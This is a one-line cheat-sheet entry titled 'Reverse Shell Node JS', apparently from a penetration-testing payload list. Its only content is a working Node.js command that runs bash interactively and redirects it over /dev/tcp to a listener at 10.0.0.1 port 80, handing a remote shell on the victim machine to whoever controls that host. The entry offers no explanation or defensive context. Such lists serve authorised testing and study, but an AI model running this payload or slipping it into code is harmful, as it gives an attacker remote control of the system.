### Reverse Shell Node JS
```
require('child_process').exec('bash -i >& /dev/tcp/10.0.0.1/80 0>&1');
```
